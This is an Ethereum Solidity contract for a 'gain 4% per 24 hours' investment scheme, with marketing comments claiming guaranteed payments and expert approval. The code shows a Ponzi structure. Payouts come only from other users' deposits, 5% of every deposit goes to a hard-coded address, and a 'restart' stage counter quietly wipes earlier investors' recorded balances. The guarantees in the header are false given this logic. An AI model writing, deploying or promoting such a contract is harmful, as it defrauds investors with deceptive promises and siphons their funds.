1 pragma solidity ^0.4.25;
2 
3 /**
4  *
5  * RESTARTED Contract
6  *  - GAIN 4% PER 24 HOURS (every 5900 blocks)
7  *
8  * How to use:
9  *  1. Send any amount of ether to make an investment
10  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
11  *  OR
12  *  2b. Send more ether to reinvest AND get your profit at the same time
13  * 
14  *  Payments are guaranteed while there is Ether in the fund
15  *  Automatic restart when the fund has less than 1% of the maximum amount in one stage
16  *
17  * RECOMMENDED GAS LIMIT: 200000
18  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
19  *
20  * Contract reviewed and approved by pros!
21  *
22  */
23 contract Restarted {
24     // constants
25     uint public percentage = 4;
26     // period
27     uint public period = 5900;
28     // stage
29     uint public stage = 1;
30     // records amounts invested
31     mapping (uint => mapping (address => uint256)) public invested;
32     // records blocks at which investments were made
33     mapping (uint => mapping (address => uint256)) public atBlock;
34     // records maximum amount in fund
35     mapping (uint => uint) public maxFund;
36 
37     // this function called every time anyone sends a transaction to this contract
38     function () external payable {
39         // if sender (aka YOU) is invested more than 0 ether
40         if (invested[stage][msg.sender] != 0) {
41             // calculate profit amount as such:
42             // amount = (amount invested) * (percentage %) * (blocks since last transaction) / 5900
43             // 5900 is an average block count per day produced by Ethereum blockchain
44             uint256 amount = invested[stage][msg.sender] * percentage / 100 * (block.number - atBlock[stage][msg.sender]) / period;
45             
46             uint max = (address(this).balance - msg.value) * 9 / 10;
47             if (amount > max) {
48                 amount = max;
49             }
50 
51             // send calculated amount of ether directly to sender (aka YOU)
52             msg.sender.transfer(amount);
53         }
54         
55         // transfer 5% to the advertising budget of the project
56         address(0x4C15C3356c897043C2626D57e4A810D444a010a8).transfer(msg.value / 20);
57         
58         uint balance = address(this).balance;
59         
60         if (balance > maxFund[stage]) {
61             maxFund[stage] = balance;
62         }
63         if (balance < maxFund[stage] / 100) {
64             stage++;
65         }
66         
67         // record block number and invested amount (msg.value) of this transaction
68         atBlock[stage][msg.sender] = block.number;
69         invested[stage][msg.sender] += msg.value;
70     }
71 }